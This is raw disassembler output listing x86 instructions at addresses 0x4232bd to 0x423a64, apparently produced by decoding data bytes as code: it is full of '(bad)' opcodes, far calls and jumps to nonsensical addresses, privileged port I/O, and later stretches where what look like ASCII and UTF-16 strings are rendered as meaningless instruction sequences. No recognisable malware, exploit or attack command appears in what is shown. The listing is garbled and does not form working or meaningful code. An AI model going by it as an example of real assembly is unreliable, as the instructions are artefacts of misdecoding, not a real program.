  4232bd:	sbb    eax,0x5e10a971
  4232c2:	mov    BYTE PTR [ebx-0x2f],dh
	...
  4232d1:	add    BYTE PTR [edi],dh
  4232d3:	(bad)  
  4232d4:	out    0xc2,eax
  4232d6:	mul    ebx
  4232d8:	aaa    
  4232d9:	cmc    
  4232da:	xchg   ecx,eax
  4232db:	call   0x8e73:0xf97ceef4
  4232e2:	jbe    0x4232c1
  4232e4:	add    DWORD PTR [eax],eax
  4232e6:	pop    ebx
  4232e7:	add    BYTE PTR [eax],al
  4232e9:	add    BYTE PTR [edi],dl
  4232eb:	xor    al,0x98
  4232ed:	pop    ebp
  4232ee:	(bad)  
  4232f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232f1:	pop    ss
  4232f2:	and    al,0xbb
  4232f4:	push   ebp
  4232f5:	xchg   esi,eax
  4232f6:	adc    al,0x71
  4232f8:	adc    DWORD PTR [ecx+ebx*1-0x4e475d7c],ebx
  4232ff:	iret   
  423300:	inc    edi
  423301:	sub    eax,0xaa72b3dc
  423306:	pusha  
  423307:	or     DWORD PTR [ebx-0x7bced5a8],0x6228ef32
  423311:	or     dh,bh
  423313:	dec    eax
  423314:	out    0xd4,al
  423316:	cli    
  423317:	xchg   ecx,eax
  423318:	xchg   esp,eax
  423319:	xchg   ecx,eax
  42331a:	mov    ds:0x509d2d1a,eax
  42331f:	scas   eax,DWORD PTR es:[edi]
  423320:	enter  0x7234,0xcb
  423324:	call   0x8447:0x3ba8306b
  42332b:	loope  0x4232d4
  42332d:	fsubr  QWORD PTR [edi+0x1c04b15b]
  423333:	(bad)  
  423335:	test   eax,0xb0cfb33e
  42333a:	lods   al,BYTE PTR ds:[esi]
  42333b:	shr    BYTE PTR [esi],cl
  42333d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42333e:	retf   0xfcff
  423341:	scas   eax,DWORD PTR es:[edi]
  423342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423343:	gs cmc 
	...
  423351:	add    BYTE PTR [esi],dl
  423353:	aad    0xdf
  423355:	out    dx,eax
  423356:	fucomip st,st(7)
  423358:	ss std 
  42335a:	cmp    BYTE PTR [esi-0x3b8fa0c6],al
  423360:	cmp    BYTE PTR [eax-0x2f],ch
  423363:	fld    QWORD PTR [ecx]
  423365:	add    BYTE PTR [ebx+0x0],bl
  423368:	add    BYTE PTR [eax],al
  42336a:	push   0x73
  42336c:	add    al,0x72
  42336e:	out    dx,eax
  42336f:	jno    0x42330c
  423371:	les    eax,FWORD PTR [ecx+esi*4-0x5]
  423375:	lods   eax,DWORD PTR ds:[esi]
  423376:	cmp    eax,0xf8d6c9af
  42337b:	lods   eax,DWORD PTR ds:[esi]
  42337c:	add    BYTE PTR [edi],cl
  42337e:	mov    ds:0x6d54d7cb,al
  423383:	ins    BYTE PTR es:[edi],dx
  423384:	mov    ah,0x75
  423386:	push   ebp
  423387:	cmp    BYTE PTR [ebp-0x49],dh
  42338a:	xchg   DWORD PTR [esi],edx
  42338c:	cmp    eax,DWORD PTR [edi*2+0x6c71d9be]
  423393:	cwde   
  423394:	xchg   esp,eax
  423395:	sub    al,0x7c
  423397:	sub    DWORD PTR [edi-0x7682ecb0],esi
  42339d:	iret   
  42339e:	mov    edi,0xe18d1c8
  4233a3:	rcl    bl,cl
  4233a5:	mov    eax,ds:0x69cba746
  4233aa:	les    ebp,FWORD PTR ds:0xa77d8ab8
  4233b0:	adc    ebx,0x1
  4233b3:	cmp    al,0x25
  4233b5:	ror    DWORD PTR [ebx-0xe8f33fb],0xcb
  4233bc:	adc    bh,0xf1
  4233bf:	retf   0x968f
  4233c2:	jnp    0x42337a
  4233c4:	int    0x0
	...
  4233d2:	outs   dx,BYTE PTR ds:[esi]
  4233d3:	jbe    0x4233b9
  4233d5:	retf   0xdafc
  4233d8:	outs   dx,BYTE PTR ds:[esi]
  4233d9:	neg    BYTE PTR [eax]
  4233db:	xchg   edx,eax
  4233dc:	xchg   DWORD PTR [edi+0x2726f505],edx
  4233e2:	sub    al,0xde
  4233e4:	add    DWORD PTR [eax],eax
  4233e6:	pop    ebx
  4233e7:	add    BYTE PTR [eax],al
  4233e9:	add    BYTE PTR [ebx-0x6756cd37],dl
  4233ef:	adc    bh,ch
  4233f1:	cmp    dh,BYTE PTR [eax]
  4233f3:	in     al,dx
  4233f4:	mov    BYTE PTR ds:0x92faacdd,dl
  4233fa:	mov    bh,0x4f
  4233fc:	inc    eax
  4233fd:	je     0x423412
  4233ff:	lahf   
  423400:	and    BYTE PTR [esi-0x38f08b5c],bh
  423406:	add    BYTE PTR [ebp+0x5a],bh
  423409:	mov    bh,BYTE PTR [edi]
  42340b:	mov    ebp,0xe0a5257d
  423410:	and    edi,DWORD PTR [esi+0x1b5e7cda]
  423416:	inc    ecx
  423417:	push   ebp
  423418:	sti    
  423419:	fiadd  DWORD PTR [edi-0x2ea7e6f3]
  42341f:	shr    DWORD PTR [edx],0xd
  423422:	mov    DWORD PTR [eax],ebp
  423424:	fdivr  QWORD PTR [eax-0x30]
  423427:	mov    al,ds:0xfa3f55d1
  42342c:	xchg   esp,eax
  42342d:	cmc    
  42342e:	push   eax
  42342f:	dec    ebx
  423430:	mov    eax,0x4a61f154
  423435:	shl    bl,1
  423437:	je     0x4233fe
  423439:	xchg   edi,eax
  42343a:	cmp    al,0xdd
  42343c:	pop    edx
  42343d:	inc    ecx
  42343e:	xor    al,0x43
  423440:	adc    al,0xda
  423442:	je     0x423441
  423444:	and    al,0x0
	...
  423452:	cmp    dl,BYTE PTR [edx-0x3c]
  423455:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42345c:	nop
  42345d:	ror    ebx,cl
  42345f:	inc    ebx
  423460:	add    dl,ah
  423462:	xchg   esi,ebx
  423464:	add    DWORD PTR [eax],eax
  423466:	pop    ebx
  423467:	add    BYTE PTR [eax],al
  423469:	add    BYTE PTR [eax-0x4312e97c],dh
  42346f:	and    ecx,DWORD PTR [edx+ebp*1+0x16]
  423473:	push   0xffffffc6
  423475:	and    al,0xc2
  423477:	adc    DWORD PTR [esi-0x62],ebx
  42347a:	xchg   DWORD PTR [eax-0xa],esi
  42347d:	or     al,0x55
  42347f:	pop    edi
  423480:	out    0x5e,al
  423482:	ret    
  423483:	loope  0x42343f
  423485:	int    0xf6
  423487:	pop    es
  423488:	jo     0x4234ca
  42348a:	cmc    
  42348b:	iret   
  42348c:	dec    esi
  42348d:	ss pusha 
  42348f:	or     edx,ecx
  423491:	adc    dl,cl
  423493:	xor    DWORD PTR [eax+edi*1],esi
  423496:	push   edx
  423497:	and    ecx,DWORD PTR [edx]
  423499:	inc    ebp
  42349a:	mov    esi,0xead0bb49
  42349f:	jmp    0x44f433d2
  4234a4:	mov    ch,0xdf
  4234a6:	sbb    ecx,DWORD PTR [edi+0x9]
  4234a9:	ss xchg ebx,eax
  4234ab:	ret    0xdfa
  4234ae:	mov    BYTE PTR [eax+0x56c0c76e],dl
  4234b4:	fld    QWORD PTR [edx-0x6d7a4bc4]
  4234ba:	in     eax,0xb2
  4234bc:	xor    al,0x3d
  4234be:	nop
  4234bf:	jnp    0x4234bf
  4234c1:	jle    0x42349c
  4234c3:	aad    0xde
	...
  4234d1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234d7:	jle    0x4234ac
  4234d9:	call   DWORD PTR [eax-0x20]
  4234dc:	cli    
  4234dd:	call   0xdee2:0xf6c4012f
  4234e4:	add    DWORD PTR [eax],eax
  4234e6:	pop    ebx
  4234e7:	add    BYTE PTR [eax],al
  4234e9:	add    ch,dl
  4234eb:	jle    0x4234d0
  4234ed:	popa   
  4234ee:	pop    ebp
  4234ef:	(bad)  
  4234f0:	jns    0x42349b
  4234f2:	test   al,0x73
  4234f4:	aam    0xbe
  4234f6:	cmp    cl,ah
  4234f8:	or     BYTE PTR [ecx-0x69],dh
  4234fb:	add    BYTE PTR [esi+esi*8+0x565db602],bh
  423502:	mov    ds:0xf0d2ed5f,al
  423507:	stos   BYTE PTR es:[edi],al
  423508:	xor    ch,BYTE PTR [edi-0x2e963cab]
  42350e:	jb     0x423490
  423510:	push   edi
  423511:	sub    edi,DWORD PTR [ecx-0x600c171d]
  423517:	rcl    edx,0xda
  42351a:	into   
  42351b:	xchg   edi,eax
  42351c:	out    0xb8,al
  42351e:	mov    ah,0xcb
  423520:	loopne 0x4234b4
  423522:	dec    ebp
  423523:	les    ebp,FWORD PTR [edi-0x79407687]
  423529:	jb     0x42352c
  42352b:	pushf  
  42352c:	sar    dh,1
  42352e:	fcomi  st,st(3)
  423530:	lock stos BYTE PTR es:[edi],al
  423532:	retf   0x9647
  423535:	in     eax,dx
  423536:	sahf   
  423537:	mov    dh,0x2e
  423539:	mov    bh,0xd6
  42353b:	xor    BYTE PTR [edx+0x5242bdd3],dh
  423541:	cmc    
  423542:	test   eax,0x310b
	...
  42354f:	add    BYTE PTR [eax],al
  423551:	add    ah,bl
  423553:	fincstp 
  423555:	shl    bh,0xee
  423558:	(bad)  
  423559:	frstor [ecx+eax*1]
  42355c:	pop    ebp
  42355d:	dec    edi
  42355e:	jg     0x4235a8
  423560:	inc    esp
  423561:	popa   
  423562:	cmp    eax,0x5b0001df
  423567:	add    BYTE PTR [eax],al
  423569:	add    BYTE PTR [edx],al
  42356b:	int3   
  42356c:	adc    bh,BYTE PTR [ecx-0xd0018d7]
  423572:	sub    eax,0x8169d5cf
  423577:	inc    esp
  423578:	enter  0x2d61,0xb3
  42357c:	or     eax,0x164c6bac
  423581:	or     DWORD PTR [esi-0x32],ecx
  423584:	daa    
  423585:	fwait
  423586:	sub    eax,0x4ac18620
  42358c:	and    cl,al
  42358e:	pop    ebp
  42358f:	sbb    dl,ah
  423591:	rcl    BYTE PTR [ebp-0x1ed72763],cl
  423597:	out    dx,al
  423598:	adc    cl,BYTE PTR [eax]
  42359a:	fs xchg esp,eax
  42359c:	dec    esp
  42359d:	jge    0x42357c
  42359f:	cmp    bl,BYTE PTR [ebx]
  4235a1:	test   al,0x9e
  4235a3:	test   eax,0x97977f34
  4235a8:	clc    
  4235a9:	lahf   
  4235aa:	push   ds
  4235ab:	xor    edi,ebp
  4235ad:	add    al,0x52
  4235af:	mov    ds:0x9b8b8a4d,al
  4235b4:	ret    0x5896
  4235b7:	jmp    FWORD PTR [eax+0x58]
  4235ba:	fistp  QWORD PTR [edi]
  4235bc:	jp     0x4235d1
  4235be:	sub    DWORD PTR [esi+esi*8-0x34],esp
  4235c2:	adc    dh,BYTE PTR [ebx]
  4235c4:	mov    ebx,0x0
	...
  4235d1:	add    BYTE PTR [edi-0x5e],ch
  4235d4:	aam    0x2a
  4235d6:	fnstsw WORD PTR [esi-0x1]
  4235d9:	out    0x52,eax
  4235db:	fcmovu st,st(5)
  4235dd:	in     eax,0x33
  4235df:	add    al,0x57
  4235e1:	mov    DWORD PTR [eax+0x5b0001df],ebx
  4235e7:	add    BYTE PTR [eax],al
  4235e9:	add    BYTE PTR [edx-0x7dc7397f],dl
  4235ef:	mov    dl,0x59
  4235f1:	popf   
  4235f2:	fwait
  4235f3:	aam    0x64
  4235f5:	jmp    0x4235b7
  4235f7:	mov    BYTE PTR [ecx+0x2b],ch
  4235fa:	jbe    0x423670
  4235fc:	cmp    eax,0x3e80ac22
  423601:	test   al,0x99
  423603:	pop    es
  423604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423605:	jp     0x42366c
  423607:	fild   WORD PTR [eax+0xc1fbf31]
  42360d:	cdq    
  42360e:	mov    eax,0x410e68f2
  423613:	mov    eax,0xffd3741
  423618:	loopne 0x423651
  42361a:	inc    ebx
  42361b:	add    cl,BYTE PTR [ebx+ebx*2-0x4c]
  42361f:	and    bl,dh
  423621:	ror    dl,0xca
  423624:	neg    DWORD PTR [esi+0x64170819]
  42362a:	pop    ecx
  42362b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42362c:	mov    DWORD PTR [ebp-0xd417d9f],esp
  423632:	aas    
  423633:	shr    DWORD PTR ds:0xb83cf055,cl
  423639:	mov    ecx,0xf1b9864a
  42363e:	jne    0x4235dc
  423640:	cli    
  423641:	stos   DWORD PTR es:[edi],eax
  423642:	jns    0x4235c4
  423644:	jne    0x423646
	...
  423652:	stc    
  423653:	sbb    al,al
  423655:	inc    esi
  423656:	jecxz  0x423636
  423658:	(bad)  
  423659:	mov    edi,0xe1f1bc83
  42365e:	xchg   edx,eax
  42365f:	jne    0x4236d6
  423661:	enter  0xdff3,0x1
  423665:	add    BYTE PTR [ebx+0x0],bl
  423668:	add    BYTE PTR [eax],al
  42366a:	les    eax,FWORD PTR [edi+edi*8+0x4d9fccac]
  423671:	xor    eax,0x144a8793
  423676:	popf   
  423677:	xor    al,0x87
  423679:	les    ebx,FWORD PTR [ecx+0x585a48e2]
  42367f:	mov    esp,0x9f9fbf4e
  423684:	sub    cl,0x6b
  423687:	lea    ebx,[ecx-0xb]
  42368a:	mov    ch,0xe2
  42368c:	cwde   
  42368d:	dec    esp
  42368e:	add    DWORD PTR [eax],esi
  423690:	sbb    esi,ebx
  423692:	ds jno 0x4236bc
  423695:	or     DWORD PTR [esi],ecx
  423697:	nop
  423698:	iret   
  423699:	clc    
  42369a:	mov    WORD PTR [edi-0x425cbdf0],ds
  4236a0:	addr16 pushf 
  4236a2:	stos   DWORD PTR es:[edi],eax
  4236a3:	in     al,0xd4
  4236a5:	mov    edi,0x1b994b9c
  4236aa:	and    BYTE PTR [eax+ecx*8-0x2a],ch
  4236ae:	fdivr  QWORD PTR [esi-0x7182da17]
  4236b4:	mov    al,0xe1
  4236b6:	or     ecx,edx
  4236b8:	cmp    BYTE PTR [edi+eax*4],ch
  4236bb:	sbb    eax,0x1e450256
  4236c0:	mov    fs,ebp
  4236c2:	popa   
  4236c3:	ds jb  0x4236c6
	...
  4236d2:	mov    eax,ds:0x3e8336b9
  4236d7:	(bad)  
  4236d8:	mov    ch,0xbb
  4236da:	icebp  
  4236db:	and    eax,0x98e28c27
  4236e0:	cwde   
  4236e1:	mov    ebx,0x1e04e
  4236e6:	pop    ebx
  4236e7:	add    BYTE PTR [eax],al
  4236e9:	add    BYTE PTR [ecx],ch
  4236eb:	ins    DWORD PTR es:[edi],dx
  4236ec:	pop    ecx
  4236ed:	pusha  
  4236ee:	xchg   esi,eax
  4236ef:	xlat   BYTE PTR ds:[ebx]
  4236f0:	retf   0x321b
  4236f3:	add    bh,bh
  4236f5:	sbb    bl,ah
  4236f7:	xchg   BYTE PTR [edx],cl
  4236f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236fa:	cs sbb eax,0x358ccfc6
  423700:	sub    BYTE PTR [ecx],al
  423702:	jno    0x42377a
  423704:	sub    al,0x15
  423706:	ins    BYTE PTR es:[edi],dx
  423707:	cmp    eax,0xddd8bf36
  42370c:	mov    ?,edx
  42370e:	sub    BYTE PTR [ebx+0x7d],0x33
  423712:	(bad)  
  423713:	mov    esp,ds
  423715:	test   BYTE PTR [ebx-0x8],al
  423718:	mov    ecx,0xdea4a464
  42371d:	aad    0x8d
  42371f:	xor    al,0xa3
  423721:	and    BYTE PTR [esi+0x1cb92f1b],al
  423727:	fs jle 0x4236ef
  42372a:	pop    ss
  42372b:	xchg   DWORD PTR [ebp-0x2bc8b630],ebp
  423731:	inc    edx
  423732:	ret    
  423733:	rcl    eax,cl
  423735:	sbb    dh,BYTE PTR [eax-0xa]
  423738:	out    dx,al
  423739:	push   es
  42373a:	retf   
  42373b:	or     al,0x2a
  42373d:	cmp    al,BYTE PTR [edi]
  42373f:	sub    edi,DWORD PTR [esi-0x3b97592]
	...
  423751:	add    BYTE PTR [edx],dl
  423753:	xlat   BYTE PTR ds:[ebx]
  423754:	repz or esi,edi
  423757:	das    
  423758:	cli    
  423759:	fist   WORD PTR [ecx]
  42375b:	dec    ebx
  42375c:	es nop
  42375e:	mov    ds:0xa97c3c34,al
  423763:	loopne 0x423766
  423765:	add    BYTE PTR [ebx+0x0],bl
  423768:	add    BYTE PTR [eax],al
  42376a:	sub    eax,0x35fdc33b
  42376f:	mov    bl,0x1
  423771:	mov    eax,ds:0x7aa9b731
  423776:	test   eax,0xffc67ac5
  42377b:	fisub  WORD PTR [ecx+0x14f8ed49]
  423781:	int3   
  423782:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  423784:	push   ds
  423785:	repz and ecx,0x8
  423789:	hlt    
  42378a:	sbb    eax,0xc3c4952f
  42378f:	xor    dl,BYTE PTR [edi]
  423791:	gs mov esi,0x596caf75
  423797:	test   eax,0x59bfe6b1
  42379c:	out    dx,eax
  42379d:	cmp    ah,BYTE PTR [eax-0x75]
  4237a0:	loop   0x4237a0
  4237a2:	jne    0x4237ac
  4237a4:	je     0x4237f7
  4237a6:	or     DWORD PTR ds:0x72645fbd,esi
  4237ac:	mov    edx,0x136c9ed3
  4237b1:	pushf  
  4237b2:	dec    esi
  4237b3:	ret    
  4237b4:	xchg   edx,ecx
  4237b6:	dec    ebp
  4237b7:	pop    eax
  4237b8:	mov    BYTE PTR [eax],al
  4237ba:	loopne 0x423820
  4237bc:	pminsw mm5,mm0
  4237bf:	mov    ecx,0x833b72c8
  4237c4:	inc    BYTE PTR [eax]
	...
  4237d2:	add    al,al
  4237d4:	inc    edx
  4237d5:	add    BYTE PTR [eax+eax*8],al
  4237d8:	inc    edx
  4237d9:	add    BYTE PTR [eax],cl
  4237db:	rol    BYTE PTR [edx+0x0],0xc
  4237df:	rol    BYTE PTR [edx+0x0],0x10
  4237e3:	rol    BYTE PTR [edx+0x0],0x14
  4237e7:	rol    BYTE PTR [edx+0x0],0x18
  4237eb:	rol    BYTE PTR [edx+0x0],0x1c
  4237ef:	rol    BYTE PTR [edx+0x0],0x57
  4237f3:	inc    edi
  4237f4:	cmp    DWORD PTR [edi+0x41],ebx
  4237f7:	pop    eax
  4237f8:	ss push esi
  4237fa:	pop    edi
  4237fb:	cmp    BYTE PTR [eax],al
  4237fd:	inc    ebx
  4237fe:	inc    ebp
  4237ff:	dec    esp
  423800:	pop    edi
  423801:	pop    eax
  423802:	push   edi
  423803:	dec    eax
  423804:	inc    edx
  423805:	add    BYTE PTR [edi+0x50],dl
  423808:	xor    eax,0x4641365f
  42380d:	cmp    DWORD PTR [edx],esi
  42380f:	xor    ebx,DWORD PTR [edi+0x32]
  423812:	aaa    
  423813:	add    BYTE PTR [eax+0x48],dl
  423816:	xor    BYTE PTR [edi+0x58],bl
  423819:	push   esp
  42381a:	inc    ecx
  42381b:	dec    ebp
  42381c:	push   ecx
  42381d:	pop    edi
  42381e:	inc    esi
  42381f:	push   ebp
  423820:	cmp    DWORD PTR [eax],eax
  423822:	push   edi
  423823:	push   ebp
  423824:	inc    ecx
  423825:	xor    dh,BYTE PTR [ebx]
  423827:	xor    ebx,DWORD PTR [edi+0x4e]
  42382a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42382e:	cmp    DWORD PTR [edi+0x38],ebx
  423831:	dec    ecx
  423832:	cmp    DWORD PTR [edx+0x36],ebx
  423835:	pop    edi
  423836:	dec    edx
  423837:	xor    BYTE PTR [edx+0x34],cl
  42383a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42383e:	xor    esi,DWORD PTR [eax]
  423840:	pop    edi
  423841:	inc    edx
  423842:	dec    ebx
  423843:	pop    eax
  423844:	pop    eax
  423845:	xor    eax,0x51414d00
  42384a:	pop    edi
  42384b:	inc    ecx
  42384c:	xor    al,BYTE PTR [ebp+0x5f]
  42384f:	inc    ecx
  423850:	dec    ebx
  423851:	cmp    DWORD PTR ds:0x5a003939,esi
  423857:	inc    ebp
  423858:	cmp    BYTE PTR [edi+0x4d],bl
  42385b:	ss dec eax
  42385d:	dec    ebx
  42385e:	add    BYTE PTR [ebp+0x57],al
  423861:	xor    DWORD PTR [edi+0x31],ebx
  423864:	dec    ebx
  423865:	xor    eax,DWORD PTR [ecx+0x30]
  423868:	push   ebx
  423869:	add    BYTE PTR [edx+esi*1+0x36],al
  42386d:	aaa    
  42386e:	pop    edi
  42386f:	push   edx
  423870:	dec    eax
  423871:	dec    ebp
  423872:	cmp    BYTE PTR [edi+0x37],bl
  423875:	inc    esi
  423876:	xor    eax,0x43355500
  42387b:	pop    edi
  42387c:	pop    ecx
  42387d:	dec    ecx
  42387e:	push   ebx
  42387f:	xor    bl,BYTE PTR [edi+0x52]
  423882:	add    BYTE PTR [eax+0x55],dl
  423885:	dec    ecx
  423886:	xor    BYTE PTR [edi+0x43],bl
  423889:	ss inc ebp
  42388b:	xor    bl,BYTE PTR [edi+0x4d]
  42388e:	xor    al,0x4a
  423890:	push   edx
  423891:	push   ebp
  423892:	add    BYTE PTR [esi+0x39],cl
  423895:	push   eax
  423896:	pop    edi
  423897:	push   ebp
  423898:	cmp    DWORD PTR [esi],esi
  42389a:	xor    BYTE PTR [ecx],dh
  42389c:	pop    edi
  42389d:	dec    edi
  42389e:	dec    esi
  42389f:	push   esp
  4238a0:	cmp    BYTE PTR [eax],al
  4238a2:	dec    esp
  4238a3:	xor    al,0x44
  4238a5:	xor    DWORD PTR [edi+0x4b],ebx
  4238a8:	xor    DWORD PTR [ebp+0x5f],eax
  4238ab:	pop    edx
  4238ac:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238b0:	pop    edi
  4238b1:	inc    edx
  4238b2:	xor    dh,BYTE PTR [ecx]
  4238b4:	push   ebx
  4238b5:	xor    DWORD PTR [ecx],edi
  4238b7:	inc    edx
  4238b8:	add    BYTE PTR [edi+0x45],al
  4238bb:	xor    al,0x38
  4238bd:	xor    BYTE PTR [eax],dh
  4238bf:	pop    edi
  4238c0:	dec    edx
  4238c1:	dec    ebx
  4238c2:	xor    eax,0x33345f4d
  4238c7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238cb:	pop    edi
  4238cc:	aaa    
  4238cd:	push   esi
  4238ce:	dec    ebx
  4238cf:	push   edx
  4238d0:	pop    edi
  4238d1:	inc    ebx
  4238d2:	add    BYTE PTR [edx+0x35],bl
  4238d5:	dec    ebp
  4238d6:	pop    edi
  4238d7:	inc    edi
  4238d8:	dec    esi
  4238d9:	xor    al,0x49
  4238db:	xor    eax,0x54590035
  4238e0:	push   edx
  4238e1:	pop    edi
  4238e2:	push   esp
  4238e3:	inc    ebx
  4238e4:	inc    ecx
  4238e5:	pop    edi
  4238e6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238e9:	push   ebp
  4238ea:	pop    edi
  4238eb:	push   ebp
  4238ec:	inc    ebp
  4238ed:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238f1:	pop    edi
  4238f2:	pop    eax
  4238f3:	dec    edx
  4238f4:	inc    edx
  4238f5:	inc    edi
  4238f6:	add    BYTE PTR [edx+0x36],al
  4238f9:	inc    ebx
  4238fa:	pop    edi
  4238fb:	xor    BYTE PTR ds:0x36464b,dh
  423901:	dec    ebx
  423902:	cmp    DWORD PTR [esi+0x37],eax
  423905:	xor    ebx,DWORD PTR [edi+0x35]
  423908:	ss inc edi
  42390a:	pop    ecx
  42390b:	dec    eax
  42390c:	pop    ecx
  42390d:	add    BYTE PTR [ebp+0x35],cl
  423910:	push   eax
  423911:	xor    BYTE PTR [edi+0x4f],bl
  423914:	pop    ecx
  423915:	xor    cl,BYTE PTR [edi+0x0]
  423918:	pop    ecx
  423919:	xor    DWORD PTR [esi+0x5f],ecx
  42391c:	xor    al,BYTE PTR [edx+0x30]
  42391f:	push   esi
  423920:	push   esp
  423921:	inc    ebp
  423922:	add    BYTE PTR [edi+0x37],al
  423925:	push   esi
  423926:	xor    DWORD PTR [edi+0x49],ebx
  423929:	xor    al,BYTE PTR [esi+0x30]
  42392c:	pop    edi
  42392d:	ss dec esi
  42392f:	cmp    BYTE PTR [eax],al
  423931:	pop    edx
  423932:	xor    eax,0x445f334b
  423937:	xor    BYTE PTR [eax],bh
  423939:	push   ecx
  42393a:	push   esi
  42393b:	xor    al,0x0
  42393d:	push   ebp
  42393e:	pop    eax
  42393f:	inc    edi
  423940:	xor    DWORD PTR [edi+0x39],ebx
  423943:	push   esp
  423944:	inc    ebx
  423945:	aaa    
  423946:	inc    esp
  423947:	add    BYTE PTR [edi+0x39],dl
  42394a:	ss pop edi
  42394c:	dec    eax
  42394d:	pop    edx
  42394e:	pop    ecx
  42394f:	inc    edi
  423950:	push   ebp
  423951:	pop    edi
  423952:	push   eax
  423953:	dec    eax
  423954:	inc    ebx
  423955:	add    BYTE PTR [ebp+0x0],dl
  423958:	xor    al,0x0
  42395a:	dec    edi
  42395b:	add    BYTE PTR [edi+0x0],bl
  42395e:	cmp    BYTE PTR [eax],al
  423960:	xor    al,BYTE PTR [eax]
  423962:	inc    ebx
  423963:	add    BYTE PTR [edx+0x0],bl
  423966:	inc    ebx
  423967:	add    BYTE PTR [edi],dh
  423969:	add    BYTE PTR [edi+0x0],bl
  42396c:	inc    ebx
  42396d:	add    BYTE PTR [eax+eax*1+0x0],al
  423971:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423975:	add    BYTE PTR [edx],dh
  423977:	add    BYTE PTR [edi+0x0],bl
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	dec    esp
  42397d:	add    BYTE PTR [esi+0x0],dl
  423980:	pop    edi
  423981:	add    BYTE PTR [ecx+0x0],bl
  423984:	push   edx
  423985:	add    BYTE PTR [esi+0x0],dl
  423988:	xor    al,BYTE PTR [eax]
  42398a:	cmp    BYTE PTR [eax],al
  42398c:	pop    edi
  42398d:	add    BYTE PTR [edx+0x0],cl
  423990:	add    BYTE PTR [eax],al
  423992:	inc    edx
  423993:	add    BYTE PTR [eax+eax*1+0x46],cl
  423997:	add    BYTE PTR [edi+0x0],bl
  42399a:	xor    eax,DWORD PTR [eax]
  42399c:	inc    ebp
  42399d:	add    BYTE PTR [ecx+0x0],cl
  4239a0:	push   edx
  4239a1:	add    BYTE PTR [ecx],bh
  4239a3:	add    BYTE PTR [esi+0x0],dl
  4239a6:	add    BYTE PTR [eax],al
  4239a8:	dec    ebp
  4239a9:	add    BYTE PTR [edi],dh
  4239ab:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239af:	add    BYTE PTR [edx+0x0],cl
  4239b2:	pop    eax
  4239b3:	add    BYTE PTR [ebx],dh
  4239b5:	add    BYTE PTR [ecx],dh
  4239b7:	add    BYTE PTR [ebx+0x0],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	dec    edi
  4239bd:	add    BYTE PTR [esi],dh
  4239bf:	add    BYTE PTR [eax+0x0],cl
  4239c2:	pop    edi
  4239c3:	add    BYTE PTR [eax],dh
  4239c5:	add    BYTE PTR [edi],dh
  4239c7:	add    BYTE PTR [ecx],dh
  4239c9:	add    BYTE PTR [edx+0x0],dl
  4239cc:	xor    eax,0x55000000
  4239d1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239d5:	add    BYTE PTR [edi+0x0],bl
  4239d8:	push   esp
  4239d9:	add    BYTE PTR [ecx+0x0],al
  4239dc:	cmp    DWORD PTR [eax],eax
  4239de:	pop    edi
  4239df:	add    BYTE PTR [ebx],dh
  4239e1:	add    BYTE PTR [eax],dh
  4239e3:	add    BYTE PTR [eax],bh
  4239e5:	add    BYTE PTR [edi+0x0],cl
  4239e8:	inc    ebx
  4239e9:	add    BYTE PTR ds:0x4d000000,dh
  4239ef:	add    BYTE PTR [esi+0x0],cl
  4239f2:	inc    ebp
  4239f3:	add    BYTE PTR [edi+0x0],bl
  4239f6:	push   esp
  4239f7:	add    BYTE PTR [esi+0x0],al
  4239fa:	cmp    BYTE PTR [eax],al
  4239fc:	push   ebx
  4239fd:	add    BYTE PTR [edx+0x0],bl
  423a00:	pop    edi
  423a01:	add    BYTE PTR [eax],dh
  423a03:	add    BYTE PTR [eax],bh
  423a05:	add    BYTE PTR [eax+0x0],cl
  423a08:	add    BYTE PTR [eax],al
  423a0a:	dec    esi
  423a0b:	add    BYTE PTR [edi+0x0],cl
  423a0e:	pop    edx
  423a0f:	add    BYTE PTR [edi+0x0],bl
  423a12:	add    BYTE PTR ss:[ecx+0x0],bl
  423a16:	dec    ebp
  423a17:	add    BYTE PTR [esi],dh
  423a19:	add    BYTE PTR [ebx],dh
  423a1b:	add    BYTE PTR [edi+0x0],bl
  423a1e:	xor    al,0x0
  423a20:	dec    esi
  423a21:	add    BYTE PTR [edx],dh
  423a23:	add    BYTE PTR [esi],dh
  423a25:	add    BYTE PTR [ecx],dh
  423a27:	add    BYTE PTR [eax],al
  423a29:	add    BYTE PTR [ebx+0x0],cl
  423a2c:	dec    eax
  423a2d:	add    BYTE PTR [eax],bh
  423a2f:	add    BYTE PTR [edi+0x0],bl
  423a32:	inc    esi
  423a33:	add    BYTE PTR [esi+0x0],al
  423a36:	push   esp
  423a37:	add    BYTE PTR [edi],dh
  423a39:	add    BYTE PTR [esi],dh
  423a3b:	add    BYTE PTR [edi+0x0],bl
  423a3e:	dec    esp
  423a3f:	add    BYTE PTR [ecx+0x0],bl
  423a42:	add    BYTE PTR [eax],al
  423a44:	push   ebx
  423a45:	add    BYTE PTR [ecx+0x0],bl
  423a48:	xor    BYTE PTR [eax],al
  423a4a:	pop    edi
  423a4b:	add    BYTE PTR [ecx],bh
  423a4d:	add    BYTE PTR [edx+0x0],dl
  423a50:	dec    eax
  423a51:	add    BYTE PTR [ecx+0x0],bl
  423a54:	xor    al,BYTE PTR [eax]
  423a56:	pop    edi
  423a57:	add    BYTE PTR [eax],dh
  423a59:	add    BYTE PTR [eax],al
  423a5b:	add    BYTE PTR [edx+0x0],al
  423a5e:	dec    edx
  423a5f:	add    BYTE PTR [esi+0x0],cl
  423a62:	xor    al,BYTE PTR [eax]
  423a64:	pop    edi
